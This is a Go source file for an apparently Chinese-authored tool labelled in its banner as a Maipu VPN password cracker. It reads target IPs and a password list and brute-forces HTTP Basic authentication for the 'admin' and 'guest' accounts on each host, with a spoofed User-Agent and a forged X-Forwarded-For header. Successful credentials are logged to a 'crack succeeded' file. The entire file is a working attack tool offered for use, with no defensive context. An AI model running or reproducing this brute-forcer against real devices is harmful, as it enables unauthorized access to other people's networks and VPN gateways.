package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
)

var ip_list []string
var pass_list []string

func main() {
	var ipfile string
	var passfile string
	flag.StringVar(&ipfile, "f", "ip.txt", "IP文件名")
	flag.StringVar(&passfile, "p", "pass.txt", "密码文件名")
	flag.Parse()
	start()
	list(ipfile, passfile)
	var name = []string{"admin","guest"}
	vpn_pass(name,ip_list, pass_list)
}

func start() {
	fmt.Println("___ ___   ____  ____  ____  __ __      __ __  ____  ____       ____   ____  _____ _____   __  ____    ____    __  __  _")
	fmt.Println("|   |   | /    ||    ||    \\|  |  |    |  |  ||    \\|    \\     |    \\ /    |/ ___// ___/  /  ]|    \\  /    |  /  ]|  |/ ]")
	fmt.Println("| _   _ ||  o  | |  | |  o  )  |  |    |  |  ||  o  )  _  |    |  o  )  o  (   \\_(   \\_  /  / |  D  )|  o  | /  / |  ' / ")
	fmt.Println("|  \\_/  ||     | |  | |   _/|  |  |    |  |  ||   _/|  |  |    |   _/|     |\\__  |\\__  |/  /  |    / |     |/  /  |    \\")
	fmt.Println("|   |   ||  _  | |  | |  |  |  :  |    |  :  ||  |  |  |  |    |  |  |  _  |/  \\ |/  \\ /   \\_ |    \\ |  _  /   \\_ |     \\")
	fmt.Println("|   |   ||  |  | |  | |  |  |     |     \\   / |  |  |  |  |    |  |  |  |  |\\    |\\    \\     ||  .  \\|  |  \\     ||  .  |")
	fmt.Println("|___|___||__|__||____||__|   \\__,_|      \\_/  |__|  |__|__|    |__|  |__|__| \\___| \\___|\\____||__|\\_||__|__|\\____||__|\\_|")
	fmt.Println("------------------------致敬:皮特·东-------------------------------------BY:MrHonest-------mrhonest@qq.com-----2020-03-15")
}

func vpn_pass(namearr []string, iplist []string, passlist []string) {
for _,name := range namearr {
	for i := 0; i < len(iplist); i++ {
		line := i + 1
		liness := len(iplist) - 1
		url := "http://" + iplist[i]
		client := &http.Client{}
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Println("失败!" + ":" + url + ":" + err.Error())
			break
		}
		for j := 0; j < len(passlist)-1; j++ {
			password := name + ":" +passlist[j]
			lines := strconv.Itoa(line)
			linesss := strconv.Itoa(liness)
			passlines := strconv.Itoa(j + 1)
			passlinesss := strconv.Itoa(len(passlist) - 1)
			strbytes := []byte(password)
			password = base64.StdEncoding.EncodeToString(strbytes)
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0")
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
			req.Header.Set("Authorization", "Basic"+" "+password)
			req.Header.Set("X-Forwarded-For", "8.8.8.8")
			fmt.Println(lines + "/" + linesss + "--------" + url + "--------" + name + ":" + passlist[j] + "---------" + passlines + "/" + passlinesss)
			response, err := client.Do(req)
			if err != nil {
				fmt.Println(url + "主机不存活")
				writer(iplist[i], "no", "")
				break
			} else if response.StatusCode == 200 || response.StatusCode == 302 {
				fmt.Println("    " + url + "破解成功:" + name + ":" + passlist[j])
				writer(iplist[i], "ola", passlist[j])
				break
			} else {
				fmt.Println(url + "破解失败!")
				
			}
		}
		writer(iplist[i], "ok", "")
	}
	}
}

func writer(ip string, status string, pass string) {
	ip = strings.Replace(ip, " ", "", -1)
	ok, _ := os.OpenFile("已完成.txt", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
	defer ok.Close()
	ola, _ := os.OpenFile("破解成功.txt", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
	defer ola.Close()
	no, _ := os.OpenFile("未破解.txt", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
	defer no.Close()
	switch status {
	case "ok":
		ok.Write([]byte(ip + "\n"))
	case "no":
		no.Write([]byte(ip + "\n"))
	case "ola":
		ola.Write([]byte(ip + ":" + "admin" + ":" + pass + "\n"))
	}
}

func list(ipfile string, passfile string) {
	ip_file, err := os.Open(ipfile)
	if err != nil {
		fmt.Print("文件打开失败,请确认存放IP文件的路径,文件名是否正确!\n")
		os.Exit(0)
	}
	pass_file, err := os.Open(passfile)
	if err != nil {
		fmt.Print("文件打开失败,请确认存放密码文件路径,文件名是否正确!\n")
		os.Exit(0)
	}
	defer ip_file.Close()
	defer pass_file.Close()
	readerip := bufio.NewReader(ip_file)
	readerpass := bufio.NewReader(pass_file)
	for {
		ip, err := readerip.ReadString('\n')
		ip = strings.Replace(ip, " ", "", -1)
		ip = strings.Replace(ip, "\n", "", -1)
		ip = strings.Replace(ip, "\r", "", -1)
		ip_list = append(ip_list, ip)
		if err == io.EOF {
			break
		}
	}
	for {
		pass, err := readerpass.ReadString('\n')
		pass = strings.Replace(pass, " ", "", -1)
		pass = strings.Replace(pass, "\n", "", -1)
		pass = strings.Replace(pass, "\r", "", -1)
		pass_list = append(pass_list, pass)
		if err == io.EOF {
		pass_list = append(pass_list, pass)
			break
		}
	}
}
